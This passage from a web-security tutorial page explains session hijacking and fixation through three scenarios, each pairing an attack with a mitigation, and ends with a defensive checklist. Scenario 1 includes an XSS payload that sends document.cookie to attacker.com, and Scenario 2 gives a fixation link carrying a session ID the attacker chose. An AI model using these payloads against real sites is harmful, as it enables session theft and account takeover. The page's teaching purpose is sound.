+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-808c-8664-d6f9396ae5f9"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80db-9717-cc1ee04671d0" class=""><strong>Real-World Scenarios</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8065-b9ba-c582a5af915e" class=""><strong>Scenario 1: Banking Application</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80ec-8726-d929928d677b" class=""><strong>Threat:</strong> Session hijacking via XSS</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80f3-9993-d9fb9a3c818f" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8096-b0e3-dd78fa2f0bc2" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker injects XSS
+&lt;script&gt;
+  fetch(&#x27;https://attacker.com/steal?cookie=&#x27; + document.cookie);
+&lt;/script&gt;
+
+// Steals session cookie
+// Uses it to access banking account
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80df-b648-fe1f98eb24df" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8000-9eb1-d86c4d668975" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// HttpOnly cookie prevents JavaScript access
+Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
+
+// Even if XSS exists, cannot steal session cookie
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8075-9ad4-ed7671ec877d" class=""><strong>Scenario 2: E-commerce Site</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80cb-9469-f66c7d463f1b" class=""><strong>Threat:</strong> Session fixation via URL</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8067-9f33-d0dbc5d649a6" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8011-979b-f5877f84c5ec" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker sends link
+https://shop.com/login?sessionid=attacker-xyz
+
+// User clicks, logs in
+// Attacker uses same session ID
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-804f-b40f-e3211ddb8a60" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-805e-9597-c09217f2161e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Regenerate session ID after login
+function login(user) {
+  authenticateUser(user);
+  regenerateSessionId();  // Old session ID invalid
+  // Attacker&#x27;s session ID no longer works
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-801b-a73d-f974da93026f" class=""><strong>Scenario 3: Social Media Platform</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80e3-8b58-c94d53f3f4bc" class=""><strong>Threat:</strong> Session hijacking via network sniffing</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c7-8bfa-e9b595781af3" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80ed-b050-dd924687f14f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// User on unencrypted WiFi
+// Attacker sniffs HTTP traffic
+// Captures session cookie
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80cc-9137-e7f0ab9442ea" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8057-9caf-e6e2f045a198" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// HTTPS prevents network sniffing
+// Secure cookie flag ensures HTTPS only
+Set-Cookie: sessionid=abc123; Secure; HttpOnly
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-80f3-8250-f5607ad72b40"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-8084-a683-d7188fda1911" class=""><strong>Summary</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80eb-a9f0-f206e620ace9" class=""><strong>Key Points</strong></h3></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8003-9b13-ede19f281a30" class="numbered-list" start="1"><li><strong>Session Hijacking</strong> = Stealing existing active session</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8032-abe1-ea9f4e8b6d67" class="numbered-list" start="2"><li><strong>Session Fixation</strong> = Forcing user to use predetermined session ID</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80f5-919a-ce16f6074444" class="numbered-list" start="3"><li><strong>Different attacks</strong> require different mitigations</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-802a-9704-f493072553e9" class="numbered-list" start="4"><li><strong>HTTPS alone is not enough</strong> - need multiple layers</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-809f-acd6-fa0f8b31ba5a" class="numbered-list" start="5"><li><strong>Regenerate session ID</strong> after login (critical for fixation)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8018-8fcc-c878a77a6461" class="numbered-list" start="6"><li><strong>HttpOnly cookies</strong> prevent XSS-based hijacking</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8002-9fdd-fe8fb762ad3f" class="numbered-list" start="7"><li><strong>Strong session IDs</strong> prevent prediction attacks</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-805a-9349-ea0f228363ec" class="numbered-list" start="8"><li><strong>Short expiration</strong> reduces attack window</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-803d-ae9c-d708c20796d4" class="numbered-list" start="9"><li><strong>Defense-in-depth</strong> approach is essential</li></ol></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8077-b5e3-ca7a4e8c8d0f" class=""><strong>Complete Mitigation Checklist</strong></h3></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8079-b9b6-e7f6db8e368c" class="bulleted-list"><li style="list-style-type:disc">✅ HTTPS for all communication</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ca-80b9-edebf47e5773" class="bulleted-list"><li style="list-style-type:disc">✅ HttpOnly cookies (XSS protection)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8022-8b29-e650368a6552" class="bulleted-list"><li style="list-style-type:disc">✅ Secure cookies (HTTPS only)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a3-ae6b-c8f7c8afcbf6" class="bulleted-list"><li style="list-style-type:disc">✅ SameSite attribute (CSRF protection)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-802d-b817-fad37e9b951f" class="bulleted-list"><li style="list-style-type:disc">✅ Strong, random session IDs</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80fd-9678-fb35f605c26e" class="bulleted-list"><li style="list-style-type:disc">✅ Session ID regeneration after login</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8061-9939-c68fec2addfd" class="bulleted-list"><li style="list-style-type:disc">✅ Session ID regeneration after security events</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-804e-82cd-ca5b3c9780d5" class="bulleted-list"><li style="list-style-type:disc">✅ Short session expiration</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808f-888c-c7678dceac26" class="bulleted-list"><li style="list-style-type:disc">✅ Inactivity timeout</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a8-bc6c-f1c5feb4c848" class="bulleted-list"><li style="list-style-type:disc">✅ IP address validation (optional)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-801e-be90-d5bf9096a0c7" class="bulleted-list"><li style="list-style-type:disc">✅ Secure session storage</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80cd-9cf6-c003bf04f8f1" class="bulleted-list"><li style="list-style-type:disc">✅ Monitoring and logging</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c1-8d4b-d81e54d0236d" class="">Remember: <strong>Session security requires multiple layers of protection. No single mitigation is sufficient!</strong></p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
